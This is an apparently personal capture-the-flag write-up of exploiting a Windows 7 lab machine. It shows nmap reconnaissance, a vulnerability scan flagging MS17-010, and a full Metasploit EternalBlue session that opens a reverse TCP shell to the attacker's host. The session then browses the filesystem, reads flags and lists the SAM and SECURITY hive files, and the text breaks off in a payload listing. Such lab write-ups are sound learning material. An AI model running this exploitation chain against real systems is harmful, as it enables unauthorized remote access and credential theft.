@@ -1,0 +1,642 @@
+I started off by running an nmap scan on the target host IP as below.
+
+Target host - 10.10.102.106
+nmap -T4 10.10.102.106 -sV -A - The T4 parameters makes the scan more aggresive, -sV detects service versions and -A detects OS.
+
+--------------------------------------------------------------------------NMAP-Port-Scan-------------------------------------------------------------------------------
+──(root㉿kali)-[~]
+└─# nmap -T4 10.10.102.106 -sV -A 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 01:02 EDT
+Nmap scan report for 10.10.102.106
+Host is up (0.27s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+|_ssl-date: 2022-04-10T05:04:45+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=Jon-PC
+| Not valid before: 2022-04-09T04:53:18
+|_Not valid after:  2022-10-09T04:53:18
+| rdp-ntlm-info: 
+|   Target_Name: JON-PC
+|   NetBIOS_Domain_Name: JON-PC
+|   NetBIOS_Computer_Name: JON-PC
+|   DNS_Domain_Name: Jon-PC
+|   DNS_Computer_Name: Jon-PC
+|   Product_Version: 6.1.7601
+|_  System_Time: 2022-04-10T05:04:30+00:00
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=4/10%OT=135%CT=1%CU=38071%PV=Y%DS=4%DC=T%G=Y%TM=625265
+OS:6C%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS
+OS:=7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M
+OS:505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
+OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
+OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
+OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
+OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
+OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
+OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
+OS:=N%T=80%CD=Z)
+
+Network Distance: 4 hops
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:4c:fd:a5:07:3b (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2022-04-10T00:04:29-05:00
+| smb2-time: 
+|   date: 2022-04-10T05:04:29
+|_  start_date: 2022-04-10T04:53:16
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT       ADDRESS
+1   30.67 ms  10.4.0.1
+2   ... 3
+4   268.76 ms 10.10.102.106
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 119.81 seconds
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+The NMAP scan has revealed useful information including a vast array of open ports & services.  We can also identify the OS of the target - it is a windows 7 host.
+From here I will use a vulnerability scan to locate any exploits the host is vulnerable too. 
+
+This can be done via Nessus Scan or nmap --script vuln 10.10.102.106 -Pn
+---------------------------------------------------------------NMAP-Vulnerability-Scan---------------------------------------------------------------------------------
+──(root㉿kali)-[~]
+└─# nmap --script vuln 10.10.102.106 -Pn
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 01:20 EDT
+Stats: 0:00:16 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 50.00% done; ETC: 01:21 (0:00:16 remaining)
+Stats: 0:00:17 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 50.00% done; ETC: 01:21 (0:00:17 remaining)
+Stats: 0:00:17 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 50.00% done; ETC: 01:21 (0:00:17 remaining)
+Stats: 0:00:17 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 50.00% done; ETC: 01:21 (0:00:17 remaining)
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Stats: 0:01:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 01:22 (0:00:00 remaining)
+Stats: 0:01:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 01:22 (0:00:00 remaining)
+Stats: 0:02:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 01:23 (0:00:00 remaining)
+Stats: 0:02:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 01:23 (0:00:00 remaining)
+Stats: 0:03:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.08% done; ETC: 01:24 (0:00:06 remaining)
+Stats: 0:03:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.08% done; ETC: 01:24 (0:00:06 remaining)
+Stats: 0:03:33 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.08% done; ETC: 01:24 (0:00:06 remaining)
+Stats: 0:03:43 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:07 remaining)
+Stats: 0:03:43 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:07 remaining)
+Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Stats: 0:03:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 89.45% done; ETC: 01:24 (0:00:08 remaining)
+Nmap scan report for 10.10.102.106
+Host is up (0.26s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+|_ssl-ccs-injection: No reply from server (TIMEOUT)
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49158/tcp open  unknown
+49159/tcp open  unknown
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+
+Nmap done: 1 IP address (1 host up) scanned in 251.89 seconds
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+We can determine from the vuln scan above that the host is vulnerable to smb-ms17-010.  Now I will launch metasploit  to deliver a payload and gain access.
+
+I enter the following command:
+
+`sudo msfdb init & msfconsole` to initialise and launch Metasploit
+Secondly I enter `search ms17-010` to search for any paylods in the msf database.
+-----------------------------------------------------------------------Metasploit-Shell--------------------------------------------------------------------------------
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce              
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+As per the metasploit output above we can identify that 5 payloads exist relating to m17_010.  For the purpose of this box I will attempt #0
+Next step is to configure the payload.
+---------------------------------------------------------Metasploit-Payload--------------------------------------------------------------------------------------------
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Using exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.98.55
+rhosts => 10.10.98.55
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.4.65.102
+lhost => 10.4.65.102
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell_reverse_tcp
+payload => windows/x64/shell_reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.4.65.102:4444 
+[*] 10.10.98.55:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.98.55:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.98.55:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.98.55:445 - The target is vulnerable.
+[*] 10.10.98.55:445 - Connecting to target for exploitation.
+[+] 10.10.98.55:445 - Connection established for exploitation.
+[+] 10.10.98.55:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.98.55:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.98.55:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.98.55:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.98.55:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.98.55:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.98.55:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.98.55:445 - Sending all but last fragment of exploit packet
+[*] 10.10.98.55:445 - Starting non-paged pool grooming
+[+] 10.10.98.55:445 - Sending SMBv2 buffers
+[+] 10.10.98.55:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.98.55:445 - Sending final SMBv2 buffers.
+[*] 10.10.98.55:445 - Sending last fragment of exploit packet!
+[*] 10.10.98.55:445 - Receiving response from exploit packet
+[+] 10.10.98.55:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.98.55:445 - Sending egg to corrupted connection.
+[*] 10.10.98.55:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.4.65.102:4444 -> 10.10.98.55:49180 ) at 2022-04-10 02:55:59 -0400
+[+] 10.10.98.55:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.98.55:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.98.55:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+As per the output above we set the target host IP using the rhosts 10.10.98.55 command.
+We set our IP to deliver the payload from using the command lhost 10.4.65.102.
+We set the payload using set payload windows/x64/shell_reverse_tcp
+We execute the payload by typing in run.
+We can determine the payload was successful due to WIN prompt.
+--------------------------------------------------------WIN7-Reverse-TCP-Shell-----------------------------------------------------------------------------------------
+Shell Banner:
+Microsoft Windows [Version 6.1.7601]
+-----
+          
+
+C:\Windows>cd ..
+cd ..
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  02:27 PM                24 flag1.txt
+07/13/2009  10:20 PM    <DIR>          PerfLogs
+04/12/2011  03:28 AM    <DIR>          Program Files
+03/17/2019  05:28 PM    <DIR>          Program Files (x86)
+12/12/2018  10:13 PM    <DIR>          Users
+04/10/2022  01:49 AM    <DIR>          Windows
+               1 File(s)             24 bytes
+               5 Dir(s)  20,632,477,696 bytes free
+
+C:\>cd users
+cd users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Users
+
+12/12/2018  10:13 PM    <DIR>          .
+12/12/2018  10:13 PM    <DIR>          ..
+12/12/2018  10:13 PM    <DIR>          Jon
+04/12/2011  03:28 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               4 Dir(s)  20,632,477,696 bytes free
+
+C:\Users>cd ..
+cd ..
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  02:27 PM                24 flag1.txt
+07/13/2009  10:20 PM    <DIR>          PerfLogs
+04/12/2011  03:28 AM    <DIR>          Program Files
+03/17/2019  05:28 PM    <DIR>          Program Files (x86)
+12/12/2018  10:13 PM    <DIR>          Users
+04/10/2022  01:49 AM    <DIR>          Windows
+               1 File(s)             24 bytes
+               5 Dir(s)  20,632,477,696 bytes free
+
+
+C:\>type flag1.txt
+type flag1.txt
+flag{access_the_machine}
+
+C:\>cd users
+cd users
+
+C:\Users>cd jon
+cd jon
+
+C:\Users\Jon>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Users\Jon
+
+12/12/2018  10:13 PM    <DIR>          .
+12/12/2018  10:13 PM    <DIR>          ..
+12/12/2018  10:13 PM    <DIR>          Contacts
+12/12/2018  10:49 PM    <DIR>          Desktop
+12/12/2018  10:49 PM    <DIR>          Documents
+12/12/2018  10:13 PM    <DIR>          Downloads
+12/12/2018  10:13 PM    <DIR>          Favorites
+12/12/2018  10:13 PM    <DIR>          Links
+12/12/2018  10:13 PM    <DIR>          Music
+12/12/2018  10:13 PM    <DIR>          Pictures
+12/12/2018  10:13 PM    <DIR>          Saved Games
+12/12/2018  10:13 PM    <DIR>          Searches
+12/12/2018  10:13 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  20,601,290,752 bytes free
+
+C:\Users\Jon>cd documents
+cd documents
+
+C:\Users\Jon\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Users\Jon\Documents
+
+12/12/2018  10:49 PM    <DIR>          .
+12/12/2018  10:49 PM    <DIR>          ..
+03/17/2019  02:26 PM                37 flag3.txt
+               1 File(s)             37 bytes
+               2 Dir(s)  20,601,290,752 bytes free
+
+C:\Users\Jon\Documents>type flag3.txt
+type flag3.txt
+flag{admin_documents_can_be_valuable}
+
+C:\Windows\System32>cd config
+cd config
+
+C:\Windows\System32\config>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Windows\System32\config
+
+04/10/2022  01:49 AM    <DIR>          .
+04/10/2022  01:49 AM    <DIR>          ..
+12/12/2018  06:00 PM            28,672 BCD-Template
+04/10/2022  02:00 AM        18,087,936 COMPONENTS
+04/10/2022  02:01 AM           262,144 DEFAULT
+03/17/2019  02:32 PM                34 flag2.txt
+07/13/2009  09:34 PM    <DIR>          Journal
+03/17/2019  02:56 PM    <DIR>          RegBack
+03/17/2019  03:05 PM           262,144 SAM
+04/10/2022  02:00 AM           262,144 SECURITY
+04/10/2022  02:09 AM        40,632,320 SOFTWARE
+04/10/2022  02:05 AM        12,582,912 SYSTEM
+11/20/2010  09:41 PM    <DIR>          systemprofile
+12/12/2018  06:03 PM    <DIR>          TxR
+               8 File(s)     72,118,306 bytes
+               6 Dir(s)  20,480,368,640 bytes free
+
+C:\Windows\System32\config>type flag2.txt
+type flag2.txt
+flag{sam_database_elevated_access}
+C:\Windows\System32\config>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+In order to complete task 5 we had to locate 3 flags in the system root, the windows password storage location and in the administrator folder.
+
+We identify flag 1 by navigating to C:
+We identify flag 2 by navigating to C:\Windows\System32\Config
+We identify flag 3 by navigating to C:\Users\Jon\Documents
+
+To complete Task 3 and 4 we need to establish a merterpreter shell.  
+------------------------------------------------------Establishing-Meterpreter-TCP-Shell-------------------------------------------------------------------------------
+exit
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.98.55      yes       The target host(s), see https://github.com/rapid7/metasploit-framewor
+                                             k/wiki/Using-Metasploit
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
+                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
+                                             t machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win
+                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
+                                             chines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve
+                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/shell_reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.4.65.102      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > shell payloads
+[-] Unknown command: shell
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                                Disclosure Date  Rank    Check  Description
+   -   ----                                                ---------------  ----    -----  -----------
+   0   payload/generic/custom                                               normal  No     Custom Payload
+   1   payload/generic/shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline
+   2   payload/generic/shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline
+   3   payload/generic/ssh/interact                                         normal  No     Interact with Established SSH Connection
+   4   payload/windows/x64/exec                                             normal  No     Windows x64 Execute Command
+   5   payload/windows/x64/loadlibrary                                      normal  No     Windows x64 LoadLibrary Path
+   6   payload/windows/x64/messagebox                                       normal  No     Windows MessageBox x64
+   7   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
+   8   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
+   9   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
+   10  payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
+   11  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   12  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
+   13  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+   14  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+   15  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
+   16  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+   17  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   18  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+   19  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
+   20  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
+   21  payload/windows/x64/peinject/bind_ipv6_tcp                           normal  No     Windows Inject Reflective PE Files, Windows x64 IPv6 Bind TCP Stager
+   22  payload/windows/x64/peinject/bind_ipv6_tcp_uuid                      normal  No     Windows Inject Reflective PE Files, Windows x64 IPv6 Bind TCP Stager with UUID Support
+   23  payload/windows/x64/peinject/bind_named_pipe                         normal  No     Windows Inject Reflective PE Files, Windows x64 Bind Named Pipe Stager
+   24  payload/windows/x64/peinject/bind_tcp                                normal  No     Windows Inject Reflective PE Files, Windows x64 Bind TCP Stager
+   25  payload/windows/x64/peinject/bind_tcp_rc4                            normal  No     Windows Inject Reflective PE Files, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   26  payload/windows/x64/peinject/bind_tcp_uuid                           normal  No     Windows Inject Reflective PE Files, Bind TCP Stager with UUID Support (Windows x64)
+   27  payload/windows/x64/peinject/reverse_named_pipe                      normal  No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (SMB) Stager
+   28  payload/windows/x64/peinject/reverse_tcp                             normal  No     Windows Inject Reflective PE Files, Windows x64 Reverse TCP Stager
+   29  payload/windows/x64/peinject/reverse_tcp_rc4                         normal  No     Windows Inject Reflective PE Files, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   30  payload/windows/x64/peinject/reverse_tcp_uuid                        normal  No     Windows Inject Reflective PE Files, Reverse TCP Stager with UUID Support (Windows x64)
+   31  payload/windows/x64/pingback_reverse_tcp                             normal  No     Windows x64 Pingback, Reverse TCP Inline
+   32  payload/windows/x64/powershell_bind_tcp                              normal  No     Windows Interactive Powershell Session, Bind TCP
+   33  payload/windows/x64/powershell_reverse_tcp                           normal  No     Windows Interactive Powershell Session, Reverse TCP
+   34  payload/windows/x64/powershell_reverse_tcp_ssl                       normal  No     Windows Interactive Powershell Session, Reverse TCP SSL
+   35  payload/windows/x64/shell/bind_ipv6_tcp                              normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager
+   36  payload/windows/x64/shell/bind_ipv6_tcp_uuid                         normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support
+   37  payload/windows/x64/shell/bind_named_pipe                            normal  No     Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager
+   38  payload/windows/x64/shell/bind_tcp                                   normal  No     Windows x64 Command Shell, Windows x64 Bind TCP Stager
+   39  payload/windows/x64/shell/bind_tcp_rc4                               normal  No     Windows x64 Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   40  payload/windows/x64/shell/bind_tcp_uuid                              normal  No     Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)
+   41  payload/windows/x64/shell/reverse_tcp                                normal  No     Windows x64 Command Shell, Windows x64 Reverse TCP Stager
+   42  payload/windows/x64/shell/reverse_tcp_rc4                            normal  No     Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   43  payload/windows/x64/shell/reverse_tcp_uuid                           normal  No     Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)
+   44  payload/windows/x64/shell_bind_tcp                                   normal  No     Windows x64 Command Shell, Bind TCP Inline
+   45  payload/windows/x64/shell_reverse_tcp                                normal  No     Windows x64 Command Shell, Reverse TCP Inline
+   46  payload/windows/x64/vncinject/bind_ipv6_tcp                          normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager
+   47  payload/windows/x64/vncinject/bind_ipv6_tcp_uuid                     normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support
+   48  payload/windows/x64/vncinject/bind_named_pipe                        normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind Named Pipe Stager
+   49  payload/windows/x64/vncinject/bind_tcp                               normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager
+   50  payload/windows/x64/vncinject/bind_tcp_rc4                           normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   51  payload/windows/x64/vncinject/bind_tcp_uuid                          normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)
+   52  payload/windows/x64/vncinject/reverse_http                           normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
+   53  payload/windows/x64/vncinject/reverse_https                          normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
+   54  payload/windows/x64/vncinject/reverse_tcp                            normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
